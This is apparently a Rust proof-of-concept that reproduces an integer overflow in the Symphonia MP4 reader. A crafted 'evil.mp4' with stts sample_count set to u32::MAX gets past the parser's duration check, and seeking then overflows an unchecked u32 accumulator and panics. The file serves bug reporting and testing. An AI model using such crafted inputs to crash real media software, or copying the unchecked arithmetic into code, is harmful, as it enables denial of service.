//! Reproduces ISOMP4_STTS_SAMPLE_COUNT_ACCUMULATOR_OVERFLOW.
//!
//! `evil.mp4` is a real, otherwise-valid AAC-in-MP4 file produced by `ffmpeg`, with its `stts`
//! (time-to-sample) atom's two entries binary-patched to
//! `{sample_count: u32::MAX, sample_delta: 0}, {sample_count: 1, sample_delta: 0}`. This still
//! passes `SttsAtom::read()`'s own overflow check (it only guards the *duration* accumulator,
//! `sample_count * sample_delta`, which stays 0 forever since `sample_delta == 0` in both
//! entries) - so the file is accepted by the real, public `IsoMp4Reader::try_new` entry point.
//!
//! It then calls the real, public `FormatReader::seek` API (exactly what any caller of this
//! crate would call to seek), which drives `SttsAtom::find_sample_for_timestamp` through the
//! real `IsoMp4Reader::seek_track_by_ts` path. That function's running `sample_num` accumulator
//! is a plain, unchecked `u32 +=` over the untrusted `sample_count` field, and overflows while
//! summing the two crafted entries.
use std::fs::File;

use symphonia_core::formats::{FormatOptions, FormatReader, SeekMode, SeekTo};
use symphonia_core::io::MediaSourceStream;
use symphonia_core::units::Time;
use symphonia_format_isomp4::IsoMp4Reader;

fn main() {
    let path = "assets/evil.mp4";
    let file = File::open(path).unwrap_or_else(|e| panic!("failed to open {path}: {e}"));
    let mss = MediaSourceStream::new(Box::new(file), Default::default());

    let mut reader = IsoMp4Reader::try_new(mss, FormatOptions::default())
        .expect("failed to construct IsoMp4Reader from evil.mp4 (should parse fine - only the \
                 lookup functions are unchecked, not SttsAtom::read())");

    let track_id = reader.tracks()[0].id;
    println!("opened evil.mp4 successfully, seeking track {track_id} to t=0.0s ...");

    // This call drives IsoMp4Reader::seek_track_by_ts -> SttsAtom::find_sample_for_timestamp,
    // which is expected to panic with "attempt to add with overflow" in a debug-assertions build.
    let result = reader.seek(SeekMode::Accurate, SeekTo::Time {
        time: Time::try_from_secs_f64(0.0).unwrap(),
        track_id: Some(track_id),
    });

    println!("seek returned without panicking: {result:?}");
    println!("BUG NOT REPRODUCED");
}
